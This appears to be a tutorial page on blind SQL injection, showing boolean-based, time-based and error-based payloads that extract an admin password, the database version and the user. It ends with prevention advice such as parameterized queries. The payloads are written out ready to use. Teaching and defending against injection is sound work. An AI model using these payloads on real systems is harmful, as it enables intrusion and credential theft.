Blind SQL Injection

When the app doesn't show query results directly, attackers ask yes/no questions and observe the response differences.

üí° Concept: Ask the database true/false questions. If TRUE, page loads normally. If FALSE, page shows error or different content. Extract data one bit at a time!

Boolean-Based Blind

‚úì TRUE Response
' AND 1=1 --

Page loads normally

‚úó FALSE Response
' AND 1=2 --

Page shows error or different content

Extracting data character by character

' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a' --

‚Üí FALSE (first char is not 'a')

' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'p' --

‚Üí TRUE (first char IS 'p'!) ‚úì

' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1) = 'a' --

‚Üí TRUE (second char IS 'a'!) ‚úì

...repeat for each character position...

üí• Result: Password extracted: password

Time-Based Blind

When there's no visible difference, use delays to infer true/false.

If TRUE ‚Üí page takes 5 seconds to load

'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
5
Error-Based Extraction

Force database errors that include the data you want in the error message.

MySQL Error Extraction

' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1))) --
Error message:
XPATH syntax error: '~p@ssw0rd123'

The password appears in the error! The ~ (0x7e) is just a separator.

MySQL EXTRACTVALUE
AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))
MySQL UPDATEXML
AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)
PostgreSQL CAST
AND 1=CAST((SELECT password FROM users) AS int)
MSSQL Convert
AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))

How to Prevent SQL Injection
‚ùå Vulnerable (String Concatenation)

‚úì Safe (Parameterized Query)

db.execute(query, [userId])
‚úì Parameterized Queries

Use placeholders (?, $1, :param) instead of concatenation

‚úì ORM / Query Builder

Use frameworks that handle escaping automatically

‚úì Input Validation

Whitelist expected formats (numbers, emails, etc.)

‚úì Least Privilege

Database user should only have permissions it needs
